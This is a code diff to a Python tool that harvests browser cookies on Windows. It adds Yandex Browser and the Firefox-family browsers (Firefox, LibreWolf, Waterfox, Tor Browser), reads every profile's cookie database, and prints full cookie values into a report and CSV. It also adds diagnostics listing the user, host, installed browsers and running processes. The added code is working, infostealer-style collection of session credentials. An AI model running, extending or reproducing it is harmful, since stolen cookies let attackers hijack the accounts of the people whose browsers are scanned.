@@ -593,14 +593,18 @@ def deduplicate(hits: list[dict]) -> list[dict]:
 
 
 # ── Browser config ─────────────────────────────────────────────────────────────
+_LAPPDATA = os.environ.get("LOCALAPPDATA", "")
+_APPDATA  = os.environ.get("APPDATA", "")
+
 BROWSERS = [
-    ("Google Chrome",  "chrome.exe",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google",        "Chrome",        "User Data")),
-    ("Microsoft Edge", "msedge.exe",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft",     "Edge",          "User Data")),
-    ("Brave",          "brave.exe",    os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")),
-    ("Vivaldi",        "vivaldi.exe",  os.path.join(os.environ.get("LOCALAPPDATA", ""), "Vivaldi",       "User Data")),
-    ("Opera",          "opera.exe",    os.path.join(os.environ.get("APPDATA", ""),      "Opera Software","Opera Stable")),
-    ("Opera GX",       "opera.exe",    os.path.join(os.environ.get("APPDATA", ""),      "Opera Software","Opera GX Stable")),
-    ("Chromium",       "chromium.exe", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Chromium",      "User Data")),
+    ("Google Chrome",  "chrome.exe",        os.path.join(_LAPPDATA, "Google",        "Chrome",        "User Data")),
+    ("Microsoft Edge", "msedge.exe",         os.path.join(_LAPPDATA, "Microsoft",     "Edge",          "User Data")),
+    ("Brave",          "brave.exe",          os.path.join(_LAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")),
+    ("Vivaldi",        "vivaldi.exe",        os.path.join(_LAPPDATA, "Vivaldi",       "User Data")),
+    ("Opera",          "opera.exe",          os.path.join(_APPDATA,  "Opera Software","Opera Stable")),
+    ("Opera GX",       "opera.exe",          os.path.join(_APPDATA,  "Opera Software","Opera GX Stable")),
+    ("Chromium",       "chromium.exe",       os.path.join(_LAPPDATA, "Chromium",      "User Data")),
+    ("Yandex Browser", "browser.exe",        os.path.join(_LAPPDATA, "Yandex",        "YandexBrowser", "User Data")),
 ]
 
 
@@ -617,7 +621,7 @@ def _get_profiles(user_data_path: str) -> list[tuple[str, str]]:
     guest = os.path.join(user_data_path, "Guest Profile")
     if os.path.isdir(guest):
         profiles.append(("Guest Profile", guest))
-    return profiles if profiles else [("Default", default)]
+    return profiles
 
 
 # ── Crypto ─────────────────────────────────────────────────────────────────────
@@ -756,6 +760,68 @@ def extract_cookies(profile_path: str, master_key: bytes) -> list[dict]:
     finally:
         if tmp_dir:
             shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+# ── Firefox-family browser specs ───────────────────────────────────────────────
+_FIREFOX_SPECS_WIN: list[tuple[str, str, list[str]]] = [
+    ("Firefox",
+     "firefox.exe",
+     [os.path.join(_APPDATA,  "Mozilla",  "Firefox",  "Profiles"),
+      os.path.join(_LAPPDATA, "Mozilla",  "Firefox",  "Profiles")]),
+    ("LibreWolf",
+     "librewolf.exe",
+     [os.path.join(_APPDATA,  "librewolf", "Profiles"),
+      os.path.join(_LAPPDATA, "LibreWolf", "Profiles")]),
+    ("Waterfox",
+     "waterfox.exe",
+     [os.path.join(_APPDATA,  "Waterfox",  "Profiles")]),
+    ("Tor Browser",
+     "firefox.exe",
+     [os.path.join(_APPDATA,  "Tor Browser", "Browser", "TorBrowser", "Data", "Browser")]),
+]
+
+def _resolve_ff_profiles_dir_win(candidates: list[str]) -> str | None:
+    return next((p for p in candidates if os.path.isdir(p)), None)
+
+def _extract_moz_cookies_win(profiles_dir: str, browser_name: str) -> list[dict]:
+    results = []
+    try:
+        entries = os.listdir(profiles_dir)
+    except OSError:
+        return results
+    for profile_name in entries:
+        db_path = os.path.join(profiles_dir, profile_name, "cookies.sqlite")
+        if not os.path.exists(db_path):
+            continue
+        tmp_dir = None
+        try:
+            tmp_db  = copy_db_with_wal(db_path)
+            tmp_dir = os.path.dirname(tmp_db)
+            conn    = sqlite_connect(tmp_db)
+            try:
+                rows = sqlite_execute(conn,
+                    "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies"
+                )
+                for host, name, value, path, expiry, secure, httponly, samesite in rows:
+                    samesite_str = {0: "None", 1: "Lax", 2: "Strict"}.get(samesite, str(samesite))
+                    results.append({
+                        "browser": browser_name,
+                        "profile": profile_name,
+                        "host": host, "name": name, "value": value or "",
+                        "path": path,
+                        "expires": datetime.fromtimestamp(expiry, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC") if expiry else "session",
+                        "secure": bool(secure), "httponly": bool(httponly),
+                        "samesite": samesite_str,
+                    })
+            except Exception:
+                pass
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            if tmp_dir:
+                shutil.rmtree(tmp_dir, ignore_errors=True)
+    return results
 
 
 # ── Firefox cookie extraction ──────────────────────────────────────────────────
@@ -1790,6 +1856,39 @@ def main():
         "=" * 70,
     ] + warn_lines
 
+    # ── Environment diagnostics ───────────────────────────────────────────────
+    lines.append("\n  -- [DIAG] Environment --")
+    try:
+        import platform
+        lines.append(f"  OS:        {platform.platform()}")
+    except Exception:
+        pass
+    lines.append(f"  User:      {os.environ.get('USERNAME', os.environ.get('USER', '?'))}")
+    lines.append(f"  Host:      {os.environ.get('COMPUTERNAME', '?')}")
+    lines.append(f"  APPDATA:   {_APPDATA or '(not set)'}")
+    lines.append(f"  LAPPDATA:  {_LAPPDATA or '(not set)'}")
+
+    lines.append("\n  -- [DIAG] Browser paths --")
+    for bname, proc, bpath in BROWSERS:
+        exists  = os.path.isdir(bpath)
+        running = bool(find_pids(proc))
+        pids    = find_pids(proc)
+        status  = ("INSTALLED" if exists else "not found") + (
+            "  RUNNING (PIDs: " + ",".join(map(str, pids)) + ")" if running else "")
+        lines.append(f"  {bname:<20} {status}")
+        if exists:
+            lines.append(f"    path: {bpath}")
+
+    for ff_name, ff_proc, ff_paths in _FIREFOX_SPECS_WIN:
+        ff_dir  = _resolve_ff_profiles_dir_win(ff_paths)
+        pids    = find_pids(ff_proc)
+        running = bool(pids)
+        status  = ("INSTALLED" if ff_dir else "not found") + (
+            "  RUNNING (PIDs: " + ",".join(map(str, pids)) + ")" if running else "")
+        lines.append(f"  {ff_name:<20} {status}")
+        if ff_dir:
+            lines.append(f"    path: {ff_dir}")
+
     targets = BROWSERS
     if args.browser:
         bf      = args.browser.lower()
@@ -1820,25 +1919,47 @@ def main():
         lines.extend(browser_lines)
         all_csv_rows.extend(browser_csv)
 
-    # Firefox (separate, unencrypted)
-    lines.append("\n" + "=" * 70)
-    lines.append("  BROWSER: Firefox")
-    lines.append("=" * 70)
-    try:
-        ff_cookies = extract_firefox_cookies_win()
-        if ff_cookies:
-            lines.append(f"[+] {len(ff_cookies)} Firefox cookie(s) across all profiles\n")
-            for ck in ff_cookies:
-                samesite = ck.get("samesite", "?")
-                lines.append(f"  Profile:  {ck.get('profile', '?')}")
-                lines.append(f"  Host:     {ck['host']}")
-                lines.append(f"  Name:     {ck['name']}")
-                lines.append(f"  Value:    {ck['value']}")
-                lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{samesite}\n")
-        else:
-            lines.append("  [--] Firefox not installed or no cookies found")
-    except Exception as e:
-        lines.append(f"  [-] Firefox error: {e}")
+    # Firefox-family browsers
+    seen_ff_dirs: set[str] = set()
+    for ff_name, ff_proc, ff_paths in _FIREFOX_SPECS_WIN:
+        ff_dir  = _resolve_ff_profiles_dir_win(ff_paths)
+        ff_pids = find_pids(ff_proc)
+        ff_running = bool(ff_pids)
+
+        lines.append("\n" + "=" * 70)
+        lines.append(f"  BROWSER: {ff_name}  [{'RUNNING' if ff_running else 'closed'}]")
+        lines.append("=" * 70)
+
+        if not ff_dir:
+            lines.append("  [--] Not installed\n")
+            continue
+
+        if ff_dir in seen_ff_dirs:
+            lines.append("  [--] Profile dir shared with Firefox (already extracted)\n")
+            continue
+        seen_ff_dirs.add(ff_dir)
+
+        if do_disk:
+            lines.append("\n  -- [DISK] Cookies --")
+            try:
+                cookies = _extract_moz_cookies_win(ff_dir, ff_name)
+                if cookies:
+                    lines.append(f"[+] {len(cookies)} cookie(s) across all profiles\n")
+                    for ck in cookies:
+                        lines.append(f"  Profile:  {ck['profile']}")
+                        lines.append(f"  Host:     {ck['host']}")
+                        lines.append(f"  Name:     {ck['name']}")
+                        lines.append(f"  Value:    {ck['value']}")
+                        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+                        all_csv_rows.append({
+                            "browser": ff_name, "profile": ck["profile"],
+                            "label": "Cookie", "service": ck["host"],
+                            "value": f"{ck['name']}={ck['value']}", "address": ck["host"],
+                        })
+                else:
+                    lines.append("  [-] No cookies found")
+            except Exception as e:
+                lines.append(f"  [-] Cookie extraction error: {e}")
 
     report = "\n".join(lines)
 
